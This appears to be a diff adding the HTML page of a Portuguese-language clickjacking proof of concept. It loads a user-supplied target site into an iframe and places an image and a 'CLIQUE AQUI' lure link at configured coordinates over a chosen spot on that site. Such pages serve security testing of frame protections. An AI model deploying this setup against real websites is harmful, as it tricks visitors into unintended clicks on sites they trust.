@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <title>💣 Clickjacking PoC - Página Y</title>
+
+  <link rel="stylesheet" href="poc.css" />
+</head>
+
+<body>
+
+  <div id="controlPanel">
+
+    <input
+      id="targetUrl"
+      type="url"
+      placeholder="https://site-alvo.com.br/"
+    />
+
+    <button id="loadTarget">
+      Carregar
+    </button>
+
+    <span id="targetStatus"></span>
+
+    <span id="targetDisplay"></span>
+
+  </div>
+
+  <iframe
+    id="targetFrame"
+    src="about:blank">
+  </iframe>
+
+  <img
+    id="pocImage"
+    src="assets/indexB.jpg"
+    alt="Imagem da PoC"
+  />
+
+  <a
+    id="redirectLink"
+    href="https://example.com/"
+    target="_blank"
+  >
+    CLIQUE AQUI
+  </a>
+
+  <script>
+    window.POC_CONFIG = {
+
+      baseWidth: 1920,
+      baseHeight: 1080,
+
+      // Coordenadas específicas da Página Y
+      targetX: 1120,
+      targetY: 420,
+
+      linkOffsetX: -60,
+      linkOffsetY: -15
+    };
+  </script>
+
+  <script src="poc.js"></script>
+
+</body>
+</html>
